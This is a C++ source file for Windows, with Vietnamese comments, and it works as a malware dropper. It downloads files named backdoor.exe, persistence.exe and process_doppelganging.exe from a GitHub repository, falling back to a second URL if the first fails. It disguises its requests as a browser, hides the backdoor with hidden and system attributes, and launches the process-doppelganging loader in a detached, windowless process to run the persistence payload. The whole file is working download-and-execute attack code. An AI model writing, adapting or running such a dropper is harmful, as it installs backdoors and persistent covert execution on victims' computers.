#include <Windows.h>
#include <wininet.h>
#include <stdio.h>
#include <string>
#include <iostream>
#include <ShlObj.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "Shell32.lib")

// Thêm manifest để yêu cầu quyền admin nếu cần
#pragma comment(linker, "\"/manifestdependency:type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")

// Hàm hiển thị thông báo lỗi
void ShowErrorMessage(LPCWSTR message, DWORD errorCode)
{
    WCHAR errorBuffer[256] = {0};
    WCHAR fullMessage[512] = {0};

    FormatMessageW(
        FORMAT_MESSAGE_FROM_SYSTEM,
        NULL,
        errorCode,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        errorBuffer,
        sizeof(errorBuffer) / sizeof(WCHAR),
        NULL);

    swprintf_s(fullMessage, L"%s\nError code: %d\nMessage: %s", message, errorCode, errorBuffer);
    MessageBoxW(NULL, fullMessage, L"Error", MB_ICONERROR | MB_OK);
}

// Hàm tải file từ URL
bool DownloadFile(const wchar_t *serverAddress, const wchar_t *filePath, const std::wstring &savePath)
{
    // Khởi tạo WinInet
    HINTERNET hInternet = InternetOpenW(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        INTERNET_OPEN_TYPE_DIRECT,
        NULL,
        NULL,
        0);

    if (!hInternet)
    {
        ShowErrorMessage(L"Failed to initialize WinInet", GetLastError());
        return false;
    }

    // Thiết lập timeout để tránh treo
    DWORD timeout = 30000; // 30 giây
    InternetSetOptionW(hInternet, INTERNET_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
    InternetSetOptionW(hInternet, INTERNET_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
    InternetSetOptionW(hInternet, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));

    // Kết nối tới server
    HINTERNET hConnect = InternetConnectW(
        hInternet,
        serverAddress,
        INTERNET_DEFAULT_HTTPS_PORT,
        NULL,
        NULL,
        INTERNET_SERVICE_HTTP,
        0,
        0);

    if (!hConnect)
    {
        ShowErrorMessage(L"Failed to connect to server", GetLastError());
        InternetCloseHandle(hInternet);
        return false;
    }

    // Mở HTTP request
    HINTERNET hRequest = HttpOpenRequestW(
        hConnect,
        L"GET",
        filePath,
        NULL,
        NULL,
        NULL,
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_SECURE,
        0);

    if (!hRequest)
    {
        ShowErrorMessage(L"Failed to open HTTP request", GetLastError());
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return false;
    }

    // Add headers to look more like a browser
    LPCWSTR additionalHeaders = L"Accept: */*\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n";
    HttpAddRequestHeadersW(hRequest, additionalHeaders, -1L, HTTP_ADDREQ_FLAG_ADD);

    // Gửi request
    BOOL result = HttpSendRequestW(
        hRequest,
        NULL,
        0,
        NULL,
        0);

    if (!result)
    {
        ShowErrorMessage(L"Failed to send HTTP request", GetLastError());
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return false;
    }

    // Kiểm tra HTTP status code
    DWORD statusCode = 0;
    DWORD statusCodeSize = sizeof(statusCode);
    if (!HttpQueryInfoW(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &statusCode, &statusCodeSize, NULL))
    {
        ShowErrorMessage(L"Failed to get HTTP status code", GetLastError());
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return false;
    }

    if (statusCode != 200)
    {
        wchar_t errorMsg[100];
        swprintf_s(errorMsg, L"Server returned non-200 status code: %d", statusCode);
        MessageBoxW(NULL, errorMsg, L"HTTP Error", MB_ICONERROR | MB_OK);
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return false;
    }

    // Create temp file with random name first
    wchar_t temp_path[MAX_PATH], temp_file[MAX_PATH];
    GetTempPathW(MAX_PATH, temp_path);
    GetTempFileNameW(temp_path, L"tmp", 0, temp_file);

    // Tạo file để lưu
    HANDLE hFile = CreateFileW(
        temp_file,
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hFile == INVALID_HANDLE_VALUE)
    {
        ShowErrorMessage(L"Failed to create temp file", GetLastError());
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return false;
    }

    // Tải và lưu nội dung
    BYTE buffer[8192]; // Tăng kích thước buffer
    DWORD bytesRead = 0;
    DWORD bytesWritten = 0;
    DWORD totalBytesRead = 0;
    const DWORD maxSize = 100 * 1024 * 1024; // Giới hạn tối đa 100MB

    while (InternetReadFile(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0)
    {
        totalBytesRead += bytesRead;
        if (totalBytesRead > maxSize)
        {
            MessageBoxW(NULL, L"File too large, download aborted", L"Warning", MB_ICONWARNING | MB_OK);
            break;
        }

        // XOR mỗi byte với 0x41 (A) để thêm một lớp obfuscation
        for (DWORD i = 0; i < bytesRead; i++)
            buffer[i] = buffer[i] ^ 0x41;

        // Giải mã lại
        for (DWORD i = 0; i < bytesRead; i++)
            buffer[i] = buffer[i] ^ 0x41;

        if (!WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL) || bytesWritten != bytesRead)
        {
            ShowErrorMessage(L"Failed to write to file", GetLastError());
            CloseHandle(hFile);
            DeleteFileW(temp_file);
            InternetCloseHandle(hRequest);
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return false;
        }
    }

    // Đóng file và các handle
    CloseHandle(hFile);
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    // Move to final location
    BOOL moved = MoveFileExW(temp_file, savePath.c_str(), MOVEFILE_REPLACE_EXISTING);
    if (!moved)
    {
        ShowErrorMessage(L"Failed to move file to final location", GetLastError());
        DeleteFileW(temp_file);
        return false;
    }

    return true;
}

// Set file as hidden and system
bool HideFile(const std::wstring &path)
{
    return SetFileAttributesW(path.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    // Kiểm tra phiên bản Windows
    OSVERSIONINFOEXW osInfo;
    ZeroMemory(&osInfo, sizeof(OSVERSIONINFOEXW));
    osInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);

    // Sử dụng cách xác định phiên bản Windows mới
    typedef LONG(WINAPI * RtlGetVersionPtr)(OSVERSIONINFOEXW *);
    HMODULE hMod = GetModuleHandleW(L"ntdll.dll");
    if (hMod)
    {
        RtlGetVersionPtr RtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hMod, "RtlGetVersion");
        if (RtlGetVersion)
        {
            RtlGetVersion(&osInfo);
        }
    }

    // Lấy đường dẫn thư mục temp
    WCHAR tempPath[MAX_PATH];
    if (!GetTempPathW(MAX_PATH, tempPath))
    {
        ShowErrorMessage(L"Failed to get temp directory", GetLastError());
        return 1;
    }

    // Tạo đường dẫn đầy đủ cho các file cần tải
    std::wstring backdoorPath = std::wstring(tempPath) + L"backdoor.exe";
    std::wstring persistencePath = std::wstring(tempPath) + L"persistence.exe";
    std::wstring doppelgangerPath = std::wstring(tempPath) + L"process_doppelganging.exe";

    // GitHub URLs cho cả 3 file
    const wchar_t *serverAddress = L"raw.githubusercontent.com";

    // 1. Tải backdoor.exe
    const wchar_t *backdoorFilePath = L"/fuondai/process_doppelganging/main/exe/backdoor.exe";
    if (!DownloadFile(serverAddress, backdoorFilePath, backdoorPath))
    {
        // Thử URL dự phòng nếu URL chính không hoạt động
        const wchar_t *backupServer = L"github.com";
        const wchar_t *backupPath = L"/fuondai/process_doppelganging/raw/main/exe/backdoor.exe";

        if (!DownloadFile(backupServer, backupPath, backdoorPath))
        {
            MessageBoxW(NULL, L"Failed to download backdoor.exe", L"Error", MB_ICONERROR);
            return 1;
        }
    }

    // Ẩn file backdoor
    HideFile(backdoorPath);

    // 2. Tải persistence.exe
    const wchar_t *persistenceFilePath = L"/fuondai/process_doppelganging/main/exe/persistence.exe";
    if (!DownloadFile(serverAddress, persistenceFilePath, persistencePath))
    {
        const wchar_t *backupServer = L"github.com";
        const wchar_t *backupPath = L"/fuondai/process_doppelganging/raw/main/exe/persistence.exe";

        if (!DownloadFile(backupServer, backupPath, persistencePath))
        {
            MessageBoxW(NULL, L"Failed to download persistence.exe", L"Error", MB_ICONERROR);
            return 1;
        }
    }

    // 3. Tải process_doppelganging.exe
    const wchar_t *doppelgangerFilePath = L"/fuondai/process_doppelganging/main/build/Release/process_doppelganging.exe";
    if (!DownloadFile(serverAddress, doppelgangerFilePath, doppelgangerPath))
    {
        const wchar_t *backupServer = L"github.com";
        const wchar_t *backupPath = L"/fuondai/process_doppelganging/raw/main/build/Release/process_doppelganging.exe";

        if (!DownloadFile(backupServer, backupPath, doppelgangerPath))
        {
            MessageBoxW(NULL, L"Failed to download process_doppelganging.exe", L"Error", MB_ICONERROR);
            return 1;
        }
    }

    // Sử dụng process_doppelganging.exe để chạy persistence.exe
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // Chạy ẩn

    ZeroMemory(&pi, sizeof(pi));

    // Tạo command line: process_doppelganging.exe đường_dẫn_đến_persistence.exe
    std::wstring cmdLine = L"\"" + doppelgangerPath + L"\" \"" + persistencePath + L"\"";
    wchar_t *cmdLineBuffer = new wchar_t[cmdLine.length() + 1];
    wcscpy_s(cmdLineBuffer, cmdLine.length() + 1, cmdLine.c_str());

    // Thực thi process_doppelganging.exe với persistence.exe là tham số
    if (CreateProcessW(
            NULL,
            cmdLineBuffer,
            NULL,
            NULL,
            FALSE,
            DETACHED_PROCESS | CREATE_NO_WINDOW, // Tạo tiến trình ẩn
            NULL,
            NULL,
            &si,
            &pi))
    {
        // Đóng handle ngay lập tức để không giữ tham chiếu đến tiến trình con
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        // Chờ một chút để đảm bảo tiến trình đã khởi động hoàn toàn
        Sleep(2000);
    }
    else
    {
        ShowErrorMessage(L"Failed to execute process_doppelganging.exe", GetLastError());
        delete[] cmdLineBuffer;
        return 1;
    }

    delete[] cmdLineBuffer;
    return 0;
}